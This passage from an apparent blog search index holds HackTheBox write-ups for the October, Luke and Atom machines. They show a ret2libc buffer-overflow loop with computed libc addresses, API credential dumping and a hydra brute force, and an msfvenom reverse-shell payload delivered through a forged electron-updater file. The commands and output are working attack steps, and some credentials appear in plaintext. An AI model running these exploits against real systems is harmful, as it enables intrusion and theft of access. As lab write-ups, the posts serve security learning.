Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq Now pass the payload to program Program crashed at 0x64413764 It\u0026rsquo;s located at 112 └─$ msf-pattern_offset -q d7Ad [*] Exact match at offset 112 Generate the same payload with python └─$ python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*112 + \u0026#34;B\u0026#34;*4)\u0026#39; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB Now we control the EIP register Since we can\u0026rsquo;t run shellcode from stack, we can perform ret2libc attack We have to find the address of libc on the box www-data@october:/var/www/html/cms/storage/app/media$ ldd /usr/local/bin/ovrflw | grep libc libc.so.6 =\u0026gt; /lib/i386-linux-gnu/libc.so.6 (0xb75d7000) Now we need to find the offsets of system, exit syscalls We also need an offset of /bin/sh www-data@october:/var/www/html/cms/storage/app/media$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e \u0026#34; system\u0026#34; -e \u0026#34; exit\u0026#34; 139: 00033260 45 FUNC GLOBAL DEFAULT 12 exit@@GLIBC_2.0 1443: 00040310 56 FUNC WEAK DEFAULT 12 system@@GLIBC_2.0 www-data@october:/var/www/html/cms/storage/app/media$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep -e \u0026#34;/bin/\u0026#34; 162bac /bin/sh 164b10 /bin/csh Now we have to calculate the addresses system: 0xb75d7000 + 0x40310 = 0xb7617310 exit: 0xb75d7000 + 0x33260 = 0xb760a260 /bin/sh: 0xb75d7000 + 0x162bac = 0xb7739bac The payload will be: [A*112] + system + exit + /bin/sh Okay, the problem will be the ASLR We will have to run the exploit several times Until we get a hit www-data@october:/var/www/html/cms/storage/app/media$ while true; do /usr/local/bin/ovrflw $(python -c \u0026#39;print \u0026#34;\\x41\u0026#34;*112 + \u0026#34;\\x60\\xa2\\x60\\xb7\u0026#34; + \u0026#34;\\x10\\x73\\x61\\xb7\u0026#34; + \u0026#34;\\xac\\x9b\\x73\\xb7\u0026#34;\u0026#39;); done Segmentation fault (core dumped) Illegal instruction (core dumped) ... If we did everything correctly, we will receive our shell ","date":"September 10, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/october/images/october.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/october/","summary":"October Enumeration nmap └─$ nmap -Pn -p- 10.10.10.16 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 17:39 BST Nmap scan report for 10.10.10.16 (10.10.10.16) Host is up (0.092s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.16 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 17:44 BST Nmap scan report for 10.10.10.16 (10.10.10.16) Host is up (0.","tags":["HTB","webshell","bof","exploit","upload","aslr","aslr-brute-force"],"title":"[HTB] Machine: October"},{"categories":null,"contents":"Luke Enumeration nmap └─$ nmap -Pn -p- 10.10.10.137 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 15:00 BST Warning: 10.10.10.137 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.10.137 (10.10.10.137) Host is up (0.17s latency). Not shown: 65463 closed tcp ports (conn-refused), 67 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 3000/tcp open ppp 8000/tcp open http-alt └─$ nmap -Pn -p21,22,80,3000,8000 -sC -sV 10.10.10.137 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 15:21 BST Nmap scan report for 10.10.10.137 (10.10.10.137) Host is up (0.14s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3+ (ext.1) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.16.9 | Logged in as ftp | TYPE: ASCII | No session upload bandwidth limit | No session download bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3+ (ext.1) - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxr-xr-x 2 0 0 512 Apr 14 2019 webapp 22/tcp open ssh? |_ssh-hostkey: ERROR: Script execution failed (use -d to debug) 80/tcp open http Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3) |_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Luke 3000/tcp open http Node.js Express framework |_http-title: Site doesn\u0026#39;t have a title (application/json; charset=utf-8). 8000/tcp open http Ajenti http control panel |_http-title: Ajenti Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 179.76 seconds ftp └─$ ftp anonymous@10.10.10.137 Connected to 10.10.10.137. 220 vsFTPd 3.0.3+ (ext.1) ready... 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||61479|) 150 Here comes the directory listing. drwxr-xr-x 2 0 0 512 Apr 14 2019 webapp 226 Directory send OK. ftp\u0026gt; cd webapp 250 Directory successfully changed. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||7650|) 150 Here comes the directory listing. -r-xr-xr-x 1 0 0 306 Apr 14 2019 for_Chihiro.txt 226 Directory send OK. ftp\u0026gt; more for_Chihiro.txt Dear Chihiro !! As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of the actual website I\u0026#39;ve created . Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! Derry Web Server gobuster └─$ gobuster dir -u http://10.10.10.137/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.137/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/09/09 15:28:12 Starting gobuster in directory enumeration mode =============================================================== /login.php (Status: 200) [Size: 1593] /member (Status: 301) [Size: 235] [--\u0026gt; http://10.10.10.137/member/] /management (Status: 401) [Size: 381] /css (Status: 301) [Size: 232] [--\u0026gt; http://10.10.10.137/css/] /js (Status: 301) [Size: 231] [--\u0026gt; http://10.10.10.137/js/] /vendor (Status: 301) [Size: 235] [--\u0026gt; http://10.10.10.137/vendor/] /config.php (Status: 200) [Size: 202] /LICENSE (Status: 200) [Size: 1093] Foothold/Root We have root creds in /config.php root:Zk6heYCyv6ZE9Xcg We have /management and /login.php I tried root:Zk6heYCyv6ZE9Xcg but didn\u0026rsquo;t work Let\u0026rsquo;s check other ports 8000 Ajenti login the creds didn\u0026rsquo;t work also Port 3000 has an API I get Auth token is not supplied Let\u0026rsquo;s try fuzzing api endpoints └─$ wfuzz -c -u \u0026#34;http://10.10.10.137:3000/FUZZ\u0026#34; -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.137:3000/FUZZ Total requests: 220560 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 200 0 L 5 W 56 Ch \u0026#34;# directory-list-2.3-medium.xt\u0026#34; 000000003: 200 0 L 5 W 56 Ch \u0026#34;# Copyright 2007 James Fisher\u0026#34; 000000007: 200 0 L 5 W 56 Ch \u0026#34;# license, visit http://creativecommons.org/licenses/by-sa/3.0/ 000000014: 200 0 L 5 W 56 Ch \u0026#34;http://10.10.10.137:3000/ 000000010: 200 0 L 5 W 56 Ch #\u0026#34; 000000009: 200 0 L 5 W 56 Ch \u0026#34;# Suite 300, San Francisco, California, 94105, USA.\u0026#34; 000000005: 200 0 L 5 W 56 Ch \u0026#34;# This work is licensed under the Creative Commons\u0026#34; 000000013: 200 0 L 5 W 56 Ch \u0026#34;#\u0026#34; 000000012: 200 0 L 5 W 56 Ch \u0026#34;# on at least 2 different hosts\u0026#34; 000000008: 200 0 L 5 W 56 Ch \u0026#34;# or send a letter to Creative Commons, 171 Second Street,\u0026#34; 000000006: 200 0 L 5 W 56 Ch \u0026#34;# Attribution-Share Alike 3.0 License. To view a copy of this\u0026#34; 000000011: 200 0 L 5 W 56 Ch \u0026#34;# Priority ordered case-sensitive list, where entries were found\u0026#34; 000000002: 200 0 L 5 W 56 Ch \u0026#34;#\u0026#34; 000000004: 200 0 L 5 W 56 Ch \u0026#34;#\u0026#34; 000000053: 200 0 L 2 W 13 Ch \u0026#34;login\u0026#34; 000000202: 200 0 L 5 W 56 Ch \u0026#34;users\u0026#34; 000000825: 200 0 L 2 W 13 Ch \u0026#34;Login\u0026#34; 000003701: 200 0 L 5 W 56 Ch \u0026#34;Users\u0026#34; If we visit /users, we receive the same message When we visit /login we receive please auth message I tried login using creds Tried root, luke and admin And admin worked Sending token to jwt.io We can use the token to query /users └─$ curl -s http://10.10.10.137:3000/users -H \u0026#34;authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjk0MjcxMTAxLCJleHAiOjE2OTQzNTc1MDF9.51oAtSwewlVqYen5gR6GXhzSeoSNPR_1bsmlN9Ksb3U\u0026#34; | jq [ { \u0026#34;ID\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Admin\u0026#34;, \u0026#34;Role\u0026#34;: \u0026#34;Superuser\u0026#34; }, { \u0026#34;ID\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Derry\u0026#34;, \u0026#34;Role\u0026#34;: \u0026#34;Web Admin\u0026#34; }, { \u0026#34;ID\u0026#34;: \u0026#34;3\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Yuri\u0026#34;, \u0026#34;Role\u0026#34;: \u0026#34;Beta Tester\u0026#34; }, { \u0026#34;ID\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Dory\u0026#34;, \u0026#34;Role\u0026#34;: \u0026#34;Supporter\u0026#34; } ] We can try each user └─$ curl -s http://10.10.10.137:3000/users/admin -H \u0026#34;authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjk0MjcxMTAxLCJleHAiOjE2OTQzNTc1MDF9.51oAtSwewlVqYen5gR6GXhzSeoSNPR_1bsmlN9Ksb3U\u0026#34; | jq { \u0026#34;name\u0026#34;: \u0026#34;Admin\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;WX5b7)\u0026gt;/rp$U)FW\u0026#34; } └─$ curl -s http://10.10.10.137:3000/users/derry -H \u0026#34;authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjk0MjcxMTAxLCJleHAiOjE2OTQzNTc1MDF9.51oAtSwewlVqYen5gR6GXhzSeoSNPR_1bsmlN9Ksb3U\u0026#34; | jq { \u0026#34;name\u0026#34;: \u0026#34;Derry\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;rZ86wwLvx7jUxtch\u0026#34; } └─$ curl -s http://10.10.10.137:3000/users/yuri -H \u0026#34;authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjk0MjcxMTAxLCJleHAiOjE2OTQzNTc1MDF9.51oAtSwewlVqYen5gR6GXhzSeoSNPR_1bsmlN9Ksb3U\u0026#34; | jq { \u0026#34;name\u0026#34;: \u0026#34;Yuri\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;bet@tester87\u0026#34; } └─$ curl -s http://10.10.10.137:3000/users/dory -H \u0026#34;authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjk0MjcxMTAxLCJleHAiOjE2OTQzNTc1MDF9.51oAtSwewlVqYen5gR6GXhzSeoSNPR_1bsmlN9Ksb3U\u0026#34; | jq { \u0026#34;name\u0026#34;: \u0026#34;Dory\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;5y:!xa=ybfe)/QD\u0026#34; } The creds didn\u0026rsquo;t work on port 8000 and login.php So the only thing left is to try /management └─$ hydra -L users.list -P passwords.list -f 10.10.10.137 http-get /management Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-09 16:05:57 [DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task [DATA] attacking http-get://10.10.10.137:80/management [80][http-get] host: 10.10.10.137 login: Derry password: rZ86wwLvx7jUxtch 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-09 16:05:58 The content /management We have another password for ajenti page KpMasng6S5EtTy9Z And now we can login to Ajenti We have a Terminal option If we click New, it creates a new terminal Click it and we have our root shell ","date":"September 9, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/luke/images/luke.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/luke/","summary":"Luke Enumeration nmap └─$ nmap -Pn -p- 10.10.10.137 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-09 15:00 BST Warning: 10.10.10.137 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.10.137 (10.10.10.137) Host is up (0.17s latency). Not shown: 65463 closed tcp ports (conn-refused), 67 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 3000/tcp open ppp 8000/tcp open http-alt └─$ nmap -Pn -p21,22,80,3000,8000 -sC -sV 10.","tags":["HTB","credentials","api","nodejs","jwt","wfuzz","ajenti","hydra"],"title":"[HTB] Machine: Luke"},{"categories":null,"contents":"Atom Enumeration nmap └─$ nmap -Pn -p- 10.10.10.237 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 15:42 BST Nmap scan report for 10.10.10.237 (10.10.10.237) Host is up (0.094s latency). Not shown: 65528 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 443/tcp open https 445/tcp open microsoft-ds 5985/tcp open wsman 6379/tcp open redis 7680/tcp open pando-pub └─$ nmap -Pn -p80,135,443,445,5985,6379,7680 -sC -sV 10.10.10.237 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 16:01 BST Nmap scan report for 10.10.10.237 (10.10.10.237) Host is up (0.23s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Heed Solutions 135/tcp open msrpc Microsoft Windows RPC 443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 | tls-alpn: |_ http/1.1 | http-methods: |_ Potentially risky methods: TRACE |_http-title: Heed Solutions |_ssl-date: TLS randomness does not represent time 445/tcp open 0�j�7V Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 6379/tcp open redis Redis key-value store 7680/tcp filtered pando-pub Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-os-discovery: | OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3) | OS CPE: cpe:/o:microsoft:windows_10::- | Computer name: ATOM | NetBIOS computer name: ATOM\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-09-10T08:00:46-07:00 | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: mean: 2h19m23s, deviation: 4h02m30s, median: -36s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2023-09-10T15:00:47 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.43 seconds smb └─$ smbclient -N -L //10.10.10.237 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Software_Updates Disk Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.237 failed (Error NT_STATUS_IO_TIMEOUT) Unable to connect with SMB1 -- no workgroup available └─$ smbclient -N //10.10.10.237/Software_Updates Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sun Sep 10 16:53:06 2023 .. D 0 Sun Sep 10 16:53:06 2023 client1 D 0 Sun Sep 10 16:53:06 2023 client2 D 0 Sun Sep 10 16:53:06 2023 client3 D 0 Sun Sep 10 16:53:06 2023 UAT_Testing_Procedures.pdf A 35202 Fri Apr 9 12:18:08 2021 4413951 blocks of size 4096. 1372464 blocks available smb: \\\u0026gt; Web Server We can download heed_setup_v1.0.0.zip redis https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#basic-information └─$ redis-cli -h 10.10.10.237 10.10.10.237:6379\u0026gt; info NOAUTH Authentication required. 10.10.10.237:6379\u0026gt; keys * (error) NOAUTH Authentication required. 10.10.10.237:6379\u0026gt; Foothold/User heed_setup_v1.0.0.zip The content Inside the app-64.7z we see LICENSE.electron.txt Looks like an electron app I will extract app-64.7z Navigate to resources We will see app.asar https://www.electronjs.org/docs/latest/tutorial/asar-archives We can use asar tool sudo npm -g install asar └─$ asar list app.asar /createNote.html /main.js /package.json /version.html /icons /icons/ico.png /node_modules /node_modules/argparse /node_modules/argparse/LICENSE /node_modules/argparse/index.js /node_modules/argparse/package.json ... Let\u0026rsquo;s extract main.js └─$ asar extract-file app.asar main.js Content of main.js └─$ cat main.js const {app, BrowserWindow, Menu, protocol, ipcMain} = require(\u0026#39;electron\u0026#39;); const log = require(\u0026#39;electron-log\u0026#39;); const {autoUpdater} = require(\u0026#34;electron-updater\u0026#34;); const path = require(\u0026#39;path\u0026#39;); autoUpdater.logger = log; autoUpdater.logger.transports.file.level = \u0026#39;debug\u0026#39;; ... autoUpdater.on(\u0026#39;checking-for-update\u0026#39;, () =\u0026gt; { sendStatusToWindow(\u0026#39;Checking for update...\u0026#39;); }) autoUpdater.on(\u0026#39;update-available\u0026#39;, (ev, info) =\u0026gt; { sendStatusToWindow(\u0026#39;Update available.\u0026#39;); }) autoUpdater.on(\u0026#39;update-not-available\u0026#39;, (ev, info) =\u0026gt; { sendStatusToWindow(\u0026#39;Update not available.\u0026#39;); }) autoUpdater.on(\u0026#39;error\u0026#39;, (ev, err) =\u0026gt; { sendStatusToWindow(\u0026#39;Error in auto-updater.\u0026#39;); }) autoUpdater.on(\u0026#39;download-progress\u0026#39;, (ev, progressObj) =\u0026gt; { sendStatusToWindow(\u0026#39;Download progress...\u0026#39;); }) autoUpdater.on(\u0026#39;update-downloaded\u0026#39;, (ev, info) =\u0026gt; { sendStatusToWindow(\u0026#39;Update downloaded; Installing the update...\u0026#39;); }); app.on(\u0026#39;window-all-closed\u0026#39;, () =\u0026gt; { app.quit(); }); autoUpdater.on(\u0026#39;update-downloaded\u0026#39;, (ev, info) =\u0026gt; { autoUpdater.quitAndInstall(); }) app.on(\u0026#39;ready\u0026#39;, function() { autoUpdater.checkForUpdates(); }); There\u0026rsquo;s also app-update.yml in the same directory, Inside we have a vhost =\u0026gt; updates.atom.htb └─$ cat app-update.yml provider: generic url: \u0026#39;http://updates.atom.htb\u0026#39; publisherName: - HackTheBox Nothing else If we google electron-updater exploit we have a link to post Do you remember that we had a pdf file stating that we can upload updates to client folders in smb to launch QA process Our update will be installed and tested Let\u0026rsquo;s generate a payload └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.9 LPORT=6666 -f exe -o shell.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of exe file: 7168 bytes Saved as: shell.exe Now we need to create latest.yml according to post We also need base64 of SHA512 of our payload sha512sum shell.exe | cut -d ' ' -f1 | xxd -r -p | base64 -w0 version: 3.2.3 files: - url: s\u0026#39;hell.exe sha512: v1HBe7xBQbrkaeQfhDvSIayf/tVOIJy6NggEkZfkoYhagIc1pEU9GDRsEug788bOxghbiB16Jp+AtJkmq+WOSA== size: 7168 path: s\u0026#39;hell.exe sha512: v1HBe7xBQbrkaeQfhDvSIayf/tVOIJy6NggEkZfkoYhagIc1pEU9GDRsEug788bOxghbiB16Jp+AtJkmq+WOSA== releaseDate: \u0026#39;2023-09-11T10:42:02.327Z\u0026#39; Let\u0026rsquo;s upload the latest.yml and shell.exe to smb └─$ smbclient -N //10.10.10.237/Software_Updates Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Mon Sep 11 17:41:51 2023 .. D 0 Mon Sep 11 17:41:51 2023 client1 D 0 Mon Sep 11 17:41:51 2023 client2 D 0 Mon Sep 11 17:41:51 2023 client3 D 0 Mon Sep 11 17:41:51 2023 UAT_Testing_Procedures.pdf A 35202 Fri Apr 9 12:18:08 2021 4413951 blocks of size 4096. 1374666 blocks available smb: \\\u0026gt; cd client1 smb: \\client1\\\u0026gt; put latest.yml putting file latest.yml as \\client1\\latest.yml (1.1 kb/s) (average 1.1 kb/s) smb: \\client1\\\u0026gt; put shell.exe s\u0026#39;hell.exe putting file shell.exe as \\client1\\s\u0026#39;hell.exe (17.2 kb/s) (average 10.5 kb/s) smb: \\client1\\\u0026gt; And after few minutes we have our shell Root whoami c:\\Users\\jason\u0026gt;whoami whoami atom\\jason c:\\Users\\jason\u0026gt;whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ==================================== ======== SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled c:\\Users\\jason\u0026gt;whoami /groups whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ====================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Mandatory Level Label S-1-16-8192 Downloads folder c:\\Users\\jason\u0026gt;dir Downloads dir Downloads Volume in drive C has no label. Volume Serial Number is 9793-C2E6 Directory of c:\\Users\\jason\\Downloads 04/02/2021 08:00 AM \u0026lt;DIR\u0026gt; . 04/02/2021 08:00 AM \u0026lt;DIR\u0026gt; .. 03/31/2021 02:36 AM \u0026lt;DIR\u0026gt; node_modules 04/02/2021 08:21 PM \u0026lt;DIR\u0026gt; PortableKanban 0 File(s) 0 bytes 4 Dir(s) 5,628,964,864 bytes free Googling results in https://www.exploit-db.com/exploits/49409 Looks like we need a PortableKanban.pk3 file But we don\u0026rsquo;t have one c:\\Users\\jason\\Downloads\\PortableKanban\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is 9793-C2E6 Directory of c:\\Users\\jason\\Downloads\\PortableKanban 04/02/2021 08:21 PM \u0026lt;DIR\u0026gt; . 04/02/2021 08:21 PM \u0026lt;DIR\u0026gt; .. 02/27/2013 08:06 AM 58,368 CommandLine.dll 11/08/2017 01:52 PM 141,312 CsvHelper.dll 06/22/2016 09:31 PM 456,704 DotNetZip.dll 04/02/2021 07:44 AM \u0026lt;DIR\u0026gt; Files 11/23/2017 04:29 PM 23,040 Itenso.Rtf.Converter.Html.dll 11/23/2017 04:29 PM 75,776 Itenso.Rtf.Interpreter.dll 11/23/2017 04:29 PM 32,768 Itenso.Rtf.Parser.dll 11/23/2017 04:29 PM 19,968 Itenso.Sys.dll 11/23/2017 04:29 PM 376,832 MsgReader.dll 07/03/2014 10:20 PM 133,296 Ookii.Dialogs.dll 04/02/2021 07:17 AM \u0026lt;DIR\u0026gt; Plugins 04/02/2021 08:22 PM 5,920 PortableKanban.cfg 01/04/2018 09:12 PM 118,184 PortableKanban.Data.dll 01/04/2018 09:12 PM 1,878,440 PortableKanban.exe 01/04/2018 09:12 PM 31,144 PortableKanban.Extensions.dll 04/02/2021 07:21 AM 172 PortableKanban.pk3.lock 09/06/2017 12:18 PM 413,184 ServiceStack.Common.dll 09/06/2017 12:17 PM 137,216 ServiceStack.Interfaces.dll 09/06/2017 12:02 PM 292,352 ServiceStack.Redis.dll 09/06/2017 04:38 AM 411,648 ServiceStack.Text.dll 01/04/2018 09:14 PM 1,050,092 User Guide.pdf PortableKanban.cfg looks interesting c:\\Users\\jason\\Downloads\\PortableKanban\u0026gt;type PortableKanban.cfg type PortableKanban.cfg {\u0026#34;RoamingSettings\u0026#34;:{\u0026#34;DataSource\u0026#34;:\u0026#34;RedisServer\u0026#34;,\u0026#34;DbServer\u0026#34;:\u0026#34;localhost\u0026#34;,\u0026#34;DbPort\u0026#34;:6379,\u0026#34;DbEncPassword\u0026#34;:\u0026#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb\u0026#34;,\u0026#34;DbServer2\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;DbPort2\u0026#34;:6379,\u0026#34;DbEncPassword2\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;DbIndex\u0026#34;:0,\u0026#34;DbSsl\u0026#34;:false,\u0026#34;DbTimeout\u0026#34;:10,\u0026#34;FlushChanges\u0026#34;:true,\u0026#34;UpdateInterval\u0026#34;:5,\u0026#34;AutoUpdate\u0026#34;:true,\u0026#34;Caption\u0026#34;:\u0026#34;My Tasks\u0026#34;,\u0026#34;RightClickAction\u0026#34;:\u0026#34;Nothing\u0026#34;,\u0026#34;DateTimeFormat\u0026#34;:\u0026#34;ddd, M/d/yyyy h:mm tt\u0026#34;,\u0026#34;BoardForeColor\u0026#34;:\u0026#34;WhiteSmoke\u0026#34;,\u0026#34;BoardBackColor\u0026#34;:\u0026#34;DimGray\u0026#34;,\u0026#34;ViewTabsFont\u0026#34;:\u0026#34;Segoe UI, 9pt\u0026#34;,\u0026#34;SelectedViewTabForeColor\u0026#34;:\u0026#34;WhiteSmoke\u0026#34;,\u0026#34;SelectedViewTabBackColor\u0026#34;:\u0026#34;Black\u0026#34;,\u0026#34;HeaderFont\u0026#34;:\u0026#34;Segoe UI, 